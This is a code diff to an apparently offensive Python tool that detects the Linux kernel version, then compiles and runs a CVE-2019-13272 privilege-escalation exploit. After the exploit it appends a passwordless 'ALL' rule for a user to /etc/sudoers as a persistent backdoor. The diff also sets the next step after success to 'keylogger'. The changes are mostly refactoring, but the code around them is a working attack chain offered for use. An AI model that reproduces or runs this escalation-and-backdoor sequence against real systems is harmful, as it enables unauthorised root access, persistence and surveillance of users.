@@ -46,7 +46,9 @@ def search_exploit(kernel_version):
 def detect_kernel_version():
     kernel_version = exec_bash("cat /proc/version")
     # Extract the version number using regular expression
-    match = re.search(r"version (\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+)", kernel_version)
+    match = re.search(
+        r"version (\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+)", kernel_version.decode()
+    )
     if match:
         detected_version = match.group(1)
     else:
@@ -56,7 +58,7 @@ def detect_kernel_version():
 
 
 # Function to send a command to the shell
-def run_command(command):
+def run_command(process, command):
     process.stdin.write(command.encode())
     process.stdin.flush()  # Ensure the command is sent
 
@@ -80,10 +82,14 @@ def run_exploit(exploit):
             )
 
             # run commands
-            run_command(f"gcc -s {dir_path}/../utils/cve-2019-13272.c -o exploit \n")
-            run_command("./exploit \n")
-            run_command('echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n')
-            run_command(b'echo "exit" \n')
+            run_command(
+                process, f"gcc -s {dir_path}/../utils/cve-2019-13272.c -o exploit \n"
+            )
+            run_command(process, "./exploit \n")
+            run_command(
+                process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
+            )
+            run_command(process, 'echo "exit" \n')
 
             # read output
             output = process.stdout.readline()
@@ -133,9 +139,8 @@ def run():
 
     if exploit_kernel():
         print("kernel exploited")
-        next_action = "clean"  # TODO
+        next_action = "keylogger"
     else:
         print("no kernel exploit available")
         # test something else
-
     return data, next_action
